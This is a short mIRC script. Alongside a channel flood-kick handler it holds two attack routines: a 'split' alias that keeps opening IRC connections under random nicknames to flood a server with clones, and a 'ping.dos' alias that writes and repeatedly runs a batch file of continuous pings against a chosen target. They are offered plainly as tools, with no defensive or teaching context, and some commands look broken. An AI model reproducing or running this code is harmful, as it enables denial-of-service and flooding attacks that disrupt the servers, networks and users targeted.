   on *:text:*:#:{
     timer $+ $nick 1 3 unset %flood. [ $+ [ $nick ] ]
     inc %flood. [ $+ [ $nick ] ]
     if (%flood. [ $+ [ $nick ] ] > 5) { kick # $nick Flood | auser 1w $address($nick,0) }
   }
   on *:join:#:{
     echo # $address($nick,0)
   }
   alias split {
     sockopen split $+ $rname 192.168.0.1 6667
     timer -m 1 1 split
   }
   on *:sockopen:split*:{
     if ($sockerr == 0) {
       sockwrite -nt $sockname NICK $r(a,z) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(a,z)
       sockwrite -nt $sockname USER $users.name($users.name(%nick))  " $+ $rname $+ " " $+ $ip $+ " : $+ $users.name(%nick)
       timer* off
     }
   }
   alias ping.dos {
   remove 123.bat
    write 123.bat ping $1 -t $3-
     set %t.ft 0
     timer -m $2 500 run 123.bat
   }
